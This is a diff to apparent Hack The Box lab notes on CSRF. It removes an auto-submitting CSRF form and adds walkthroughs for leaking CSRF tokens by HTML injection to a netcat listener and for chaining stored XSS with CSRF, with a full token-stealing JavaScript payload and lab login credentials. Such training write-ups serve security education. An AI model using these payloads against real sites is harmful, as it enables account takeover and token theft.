@@ -211,19 +211,7 @@ We can change a user’s profile by having them visit a malicious HTML page.
 
 Malicious page (notmalicious.html):
 
-<pre><html>
-  <body>
-    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
-      <input type="hidden" name="email" value="attacker@htb.net" />
-      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
-      <input type="hidden" name="country" value="CSRF_POC" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      document.getElementById("submitMe").submit()
-    </script>
-  </body>
-</html></pre>
+<img width="956" height="421" alt="image" src="https://github.com/user-attachments/assets/afdbb4e7-372a-4ddb-bcea-826f8ec1558a" />
 
 Serve the page on your machine:
 
@@ -243,3 +231,144 @@ Ela Stienen’s profile fields (email, telephone, country) will change to the va
 
 Confirms the application lacks CSRF protection
 
+# Cross-Site Request Forgery (POST-based)
+
+Most applications perform actions via POST requests, so CSRF tokens are included in POST data. We can exploit HTML Injection/XSS to leak these tokens and mount a CSRF attack.
+
+## Lab Setup
+
+Spawn the target system and configure vhost csrf.htb.net.
+
+Login to victim account:
+
+Email: heavycat106
+Password: rocknrol
+
+After login, you can delete the account. Click “Delete” to get redirected to:
+
+`/app/delete/<your-email>`
+
+Notice that the email is reflected on the page. We can inject HTML to leak the CSRF token.
+
+## HTML Injection Example
+
+Inject this into the email value:
+
+`<h1>h1<u>underline<%2fu><%2fh1>`
+  
+The page shows h1underline
+
+Inspecting the page source reveals our injection and the hidden CSRF input
+
+## Capture CSRF Token via Netcat
+
+Start Netcat to listen on port 8000:
+
+`nc -nlvp 8000`
+
+Send this payload to the victim:
+
+`<table%20background='//<VPN/TUN Adapter IP>:8000/'`
+
+While logged in as Julie Rogers, visit:
+
+`http://csrf.htb.net/app/delete/%3Ctable background='//<VPN/TUN Adapter IP>:8000%2f`
+
+- The CSRF token is leaked via the connection to your Netcat listener
+- Works remotely; attacker does not need to be on the same network
+- This method allows you to obtain POST-based CSRF tokens via HTML Injection, enabling attacks against victim accounts.
+
+
+# XSS & CSRF Chaining
+
+Sometimes same-origin/same-site protections block cross-site requests. We can bypass them by chaining XSS and CSRF. The idea is to execute CSRF actions from the victim’s domain using a stored XSS vulnerability.
+
+## Lab Setup
+
+Spawn the target system and configure vhost minilab.htb.net.
+
+Login to attacker account:
+
+Email: crazygorilla983
+Password: pisces
+
+**Facts about the application:**
+
+- Country field is vulnerable to stored XSS
+- Same-origin/same-site protections prevent normal CSRF
+- Stored XSS can bypass these protections
+
+We will leverage the stored XSS in the Country field to issue a state-changing request.
+
+## Intercept Target Request
+
+1.Run Burp Suite and enable proxy
+2.Browse Ela Stienen’s profile → click Change Visibility → Make Public
+
+Intercept the POST request in Burp Suite; it includes:
+
+`URL: /app/change-visibility`
+
+- Method: POST
+- Parameters: csrf token, action=change
+
+Forward the request to make the profile public.
+
+## XSS Payload for CSRF
+
+Place the following payload in Country field of Ela Stienen’s profile:
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/change-visibility',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token+'&action=change');
+};
+</script>
+
+
+## Payload Breakdown
+
+Create GET request to fetch CSRF token
+
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/change-visibility',true);
+req.send();
+
+Handle GET response to extract CSRF token
+
+var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+
+Send POST request with CSRF token to change visibility
+
+var changeReq = new XMLHttpRequest();
+changeReq.open('post', '/app/change-visibility', true);
+changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+changeReq.send('csrf='+token+'&action=change');
+csrf: extracted token
+
+action=change: parameter required for request
+
+## Test the Attack
+
+Submit payload in Country field → click Save
+
+Open New Private Window, log in as victim:
+
+Email: goldenpeacock467
+Password: topcat
+
+Visit attacker’s profile:
+
+http://minilab.htb.net/profile?email=ela.stienen@example.com
+
+Reload victim’s profile page → visibility changed to public
+
+You just executed a CSRF attack via XSS, bypassing same-origin protections!
